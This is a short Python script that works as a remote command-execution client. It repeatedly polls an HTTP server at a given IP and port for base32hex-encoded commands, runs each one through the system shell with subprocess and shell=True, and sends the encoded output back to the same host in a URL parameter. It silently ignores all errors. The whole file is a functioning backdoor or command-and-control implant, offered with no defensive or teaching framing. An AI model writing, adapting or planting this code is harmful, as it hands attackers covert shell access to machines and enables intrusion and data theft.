import requests
import subprocess
import base64

def run_client(ip: str, port: int):
    while True:
        try:
            url_stdin = f'http://{ip}:{port}/input'
            resp = requests.get(url_stdin, timeout=60)
            cmd = resp.content
            resp = run(cmd)
            url_stdout = f'http://{ip}:{port}/output?msg={resp}'
            requests.get(url_stdout)
        except:
            pass
def run(cmd: bytes) -> str:
    cmd_base = base64.b32hexdecode(cmd)
    cmd = cmd_base.decode("utf-8", "ignore")
    shell = subprocess.run(args=str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout_base = base64.b32hexencode(shell.stdout).decode("utf-8", "replace")
    print(stdout_base)
    return stdout_base